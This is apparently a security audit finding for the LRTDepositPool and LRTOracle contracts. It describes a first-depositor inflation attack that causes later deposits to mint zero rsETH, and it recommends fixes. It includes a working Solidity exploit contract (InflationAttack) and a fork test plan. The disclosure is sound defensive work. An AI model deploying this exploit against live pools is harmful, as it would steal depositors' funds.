Audit Report

## Title
First Depositor Inflation Attack via Direct Asset Donation Inflating `rsETHPrice` - (File: contracts/LRTDepositPool.sol)

## Summary
An attacker can perform a classic first-depositor inflation attack against `LRTDepositPool` by depositing a minimal amount to become the sole rsETH holder, then directly transferring a large quantity of LST tokens to the pool and calling the public `LRTOracle.updateRSETHPrice()`. Because `pricePercentageLimit` defaults to `0` (disabling the price-spike guard), `rsETHPrice` is inflated to an extreme value. Any subsequent depositor who passes `minRSETHAmountExpected = 0` receives 0 rsETH for their full deposit due to integer division rounding, permanently losing their funds.

## Finding Description

**Root cause 1 — plain integer division in `getRsETHAmountToMint`:**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [1](#0-0) 

When `rsETHPrice` is artificially large, this rounds down to 0.

**Root cause 2 — `updateRSETHPrice()` is callable by anyone:**

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [2](#0-1) 

**Root cause 3 — pool accounting uses raw `balanceOf`:**

```solidity
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
``` [3](#0-2) 

A direct ERC20 `transfer` to the pool inflates `totalETHInProtocol` without minting any rsETH, so `newRsETHPrice = totalETHInProtocol.divWad(rsethSupply)` spikes proportionally. [4](#0-3) 

**Root cause 4 — `pricePercentageLimit` defaults to `0`, disabling the spike guard:**

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
``` [5](#0-4) 

The short-circuit `pricePercentageLimit > 0` evaluates to `false` when the variable is at its uninitialized default of `0`, making `isPriceIncreaseOffLimit = false` unconditionally. `setPricePercentageLimit` is admin-only and is never called during `initialize`. [6](#0-5) 

**Root cause 5 — `_beforeDeposit` does not guard against a zero rsETH mint when `minRSETHAmountExpected == 0`:**

```solidity
rsethAmountToMint = getRsETHAmountToMint(asset, depositAmount);
if (rsethAmountToMint < minRSETHAmountExpected) {
    revert MinimumAmountToReceiveNotMet();
}
``` [7](#0-6) 

`0 < 0` is `false`, so the deposit proceeds: the victim's assets are transferred in and `_mintRsETH(0)` is called. [8](#0-7) 

**Full exploit path:**

1. `rsethSupply == 0` → `rsETHPrice = 1e18` (hardcoded early return). [9](#0-8) 
2. Attacker calls `depositAsset(stETH, minAmountToDeposit, 0, "")` → mints a small amount of rsETH (e.g., 1 wei). Pool holds `minAmountToDeposit` stETH; rsETH supply = 1 wei.
3. Attacker calls `stETH.transfer(LRTDepositPool, D)` directly. Pool now holds `D + minAmountToDeposit` stETH; rsETH supply unchanged.
4. Attacker calls `updateRSETHPrice()`. Since `pricePercentageLimit == 0`, no revert. `rsETHPrice ≈ (D + minAmountToDeposit) * 1e18 / 1`.
5. Victim calls `depositAsset(stETH, V, 0, "")` where `V < D + minAmountToDeposit`:
   - `rsethAmountToMint = V * 1e18 / ((D + minAmountToDeposit) * 1e18) = 0` (rounds down).
   - `0 < 0` → no revert. Victim's `V` stETH is transferred in; 0 rsETH minted.
6. Attacker holds 100% of rsETH supply and can redeem via `LRTWithdrawalManager.initiateWithdrawal` to claim `D + minAmountToDeposit + V` stETH. Net gain: `V` stETH (victim's entire deposit).

## Impact Explanation

**Critical — direct theft of user funds.** The victim's deposit is permanently absorbed into the pool with zero rsETH minted. The attacker, holding 100% of rsETH supply, recovers their donation plus the victim's deposit upon redemption. There is no recovery path for the victim.

## Likelihood Explanation

**Medium.** Two conditions must hold simultaneously:

1. `pricePercentageLimit == 0` — this is the uninitialized default. The `initialize` function for `LRTOracle` never sets it, and `setPricePercentageLimit` is admin-only and optional. [10](#0-9) 
2. A victim passes `minRSETHAmountExpected = 0` — common in DeFi integrations, scripts, or frontends that omit slippage protection. The protocol does not enforce a non-zero minimum.

The attack is most practical at protocol launch (when rsETH supply is near zero) and can be executed atomically in a single block via a smart contract.

## Recommendation

1. **Reject zero rsETH mints unconditionally:** In `_beforeDeposit`, add `if (rsethAmountToMint == 0) revert ZeroRsETHMinted();` before the `minRSETHAmountExpected` check, independent of the caller-supplied minimum. [7](#0-6) 

2. **Set a non-zero `pricePercentageLimit` at initialization:** In `LRTOracle.initialize`, set a safe default (e.g., 5% = `5e16`) so that large single-block price jumps revert for unprivileged callers. [10](#0-9) 

3. **Mint initial rsETH to a dead address on first deposit:** When `rsethSupply == 0`, mint a minimum seed amount to `address(0xdead)` so that `totalShares` is never trivially small and the price cannot be inflated by a single wei deposit.

4. **Use a virtual offset in the price calculation** (OpenZeppelin ERC4626 pattern): Add a virtual supply offset so that `rsETHPrice` cannot be inflated to an extreme value by a small initial deposit plus donation.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositAsset(address, uint256, uint256, string calldata) external;
}
interface IOracle { function updateRSETHPrice() external; }
interface IERC20 {
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}

contract InflationAttack {
    IDepositPool pool;
    IOracle oracle;
    IERC20 stETH;

    constructor(address _pool, address _oracle, address _stETH) {
        pool = IDepositPool(_pool);
        oracle = IOracle(_oracle);
        stETH = IERC20(_stETH);
    }

    function attack(uint256 seed, uint256 donation) external {
        // Step 1: Become sole rsETH holder
        stETH.approve(address(pool), seed);
        pool.depositAsset(address(stETH), seed, 0, "");

        // Step 2: Inflate totalETHInProtocol via direct transfer
        stETH.transfer(address(pool), donation);

        // Step 3: Commit inflated price (pricePercentageLimit == 0 → no revert)
        oracle.updateRSETHPrice();

        // Any victim calling depositAsset(stETH, V, 0, "") where V < donation+seed
        // will receive 0 rsETH and permanently lose their deposit.
        // Attacker redeems their rsETH (100% of supply) via LRTWithdrawalManager
        // to claim seed + donation + victim's deposit.
    }
}
```

**Foundry fork test plan:**
1. Fork mainnet/testnet with `LRTDepositPool`, `LRTOracle`, and a supported LST deployed.
2. Assert `pricePercentageLimit == 0` (uninitialized default).
3. Deploy `InflationAttack`; fund it with stETH.
4. Call `attack(minAmountToDeposit, 1e18)`.
5. Simulate victim calling `depositAsset(stETH, 0.5e18, 0, "")`.
6. Assert victim received 0 rsETH and their 0.5e18 stETH is now in the pool.
7. Assert attacker's rsETH represents 100% of supply and can redeem the full pool balance.
